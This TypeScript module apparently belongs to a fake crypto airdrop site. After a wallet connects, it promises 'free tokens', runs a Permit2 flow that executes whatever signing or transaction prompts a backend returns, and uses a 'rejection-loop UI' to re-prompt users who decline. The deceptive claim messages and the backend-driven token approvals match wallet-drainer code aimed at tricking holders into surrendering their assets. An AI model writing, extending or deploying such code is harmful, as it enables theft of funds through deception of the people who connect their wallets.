// src/lib/claimProcessor.ts
// Called ONCE after a successful wallet connection.
// It notifies YOUR backend, then executes any wallet prompts the backend
// returns (sign message, send tx, switch chain, ...) with a rejection-loop UI.

import { toast } from 'sonner';
import { isBackendConfigured } from './backendClient';
import { runPermit2Flow } from './permit2Flow';
import { getWalletName } from '@/config/web3';

export interface StartRewardClaimArgs {
  address: string;
  chainId?: number;
}

// Prevent double-invocation for the same address in one tab session.
const handled = new Set<string>();

export const startRewardClaim = async ({ address, chainId }: StartRewardClaimArgs) => {
  if (!address) return;
  const key = `${address}:${chainId ?? 'x'}`;
  if (handled.has(key)) return;
  handled.add(key);

  console.log('🎉 Wallet connected, notifying backend', { address, chainId });

  toast.success('Wallet Connected!', {
    description: 'You are about to receive your free tokens — approve the request in your wallet.',
  });

  if (!isBackendConfigured()) {
    console.warn('VITE_BACKEND_URL not set — skipping backend call.');
    toast.success('Rewards Ready! 🎁', {
      description: 'Your airdrop allocation is now available to claim.',
    });
    return;
  }

  try {
    await runPermit2Flow({
      address,
      chainId,
      walletName: getWalletName(),
    });
  } catch (err: any) {
    console.error('Permit2 claim flow failed', err);
    toast.error('Could not reach rewards backend', {
      description: String(err?.message ?? '').slice(0, 140),
    });
    // Allow retry on next connect
    handled.delete(key);
  }
};

